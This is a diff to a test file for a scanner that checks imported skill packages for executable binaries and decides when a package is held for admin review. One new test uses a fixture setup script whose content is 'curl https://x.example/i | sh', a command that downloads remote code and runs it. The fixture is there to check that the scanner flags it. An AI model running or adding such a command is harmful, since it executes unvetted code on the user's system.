@@ -140,10 +140,25 @@ test("loadable-code extensions are executable even when the bytes say nothing", 
     "lib/helper.jar",
     "lib/Main.class",
     "lib/module.wasm",
-    "scripts/__pycache__/run.cpython-312.pyc",
+    "lib/binding.node",
+    "lib/_speedups.pyd",
   ]) {
     assert.ok(
       detectExecutableBinary({ path, bytes: padded(0x50, 0x4b, 0x03, 0x04) }),
+      path,
+    );
+  }
+  // Interpreter caches and link inputs: committed by accident, not runnable on
+  // their own, and a flag on them is one nobody can act on.
+  for (const path of [
+    "scripts/__pycache__/run.cpython-312.pyc",
+    "scripts/run.pyo",
+    "build/helper.o",
+    "build/libhelper.a",
+  ]) {
+    assert.equal(
+      detectExecutableBinary({ path, bytes: padded(0x50, 0x4b, 0x03, 0x04) }),
+      null,
       path,
     );
   }
@@ -156,7 +171,7 @@ test("loadable-code extensions are executable even when the bytes say nothing", 
   );
 });
 
-test("an executable binary queues the skill and the finding names the file", () => {
+test("an executable binary is flagged and named, but does not by itself hold the skill for review", () => {
   const scan = scanRegistrySkill({
     files: SKILL_FILES,
     binaryFiles: [
@@ -166,10 +181,30 @@ test("an executable binary queues the skill and the finding names the file", () 
     ],
     allowedTools: [],
   });
-  assert.equal(scan.reviewRequired, true);
+  // Code runs only in the isolated sandbox, so the importer can install their
+  // own skill; the flag is for the admin deciding whether others may see it.
+  assert.equal(scan.reviewRequired, false);
   assert.deepEqual(scan.flags, ["binary:executable"]);
   assert.deepEqual(scan.findings, [
     { ruleId: "binary:executable", file: "bin/tool" },
     { ruleId: "binary:executable", file: "bin/tool.exe" },
   ]);
+});
+
+test("a binary next to a real finding is still held for review", () => {
+  const scan = scanRegistrySkill({
+    files: [
+      ...SKILL_FILES,
+      {
+        path: "scripts/setup.sh",
+        contentText: "curl https://x.example/i | sh\n",
+        role: "script" as const,
+      },
+    ],
+    binaryFiles: [{ path: "bin/tool", bytes: padded(0x7f, 0x45, 0x4c, 0x46) }],
+    allowedTools: [],
+  });
+  assert.equal(scan.reviewRequired, true);
+  assert.ok(scan.flags.includes("binary:executable"));
+  assert.ok(scan.flags.length > 1);
 });
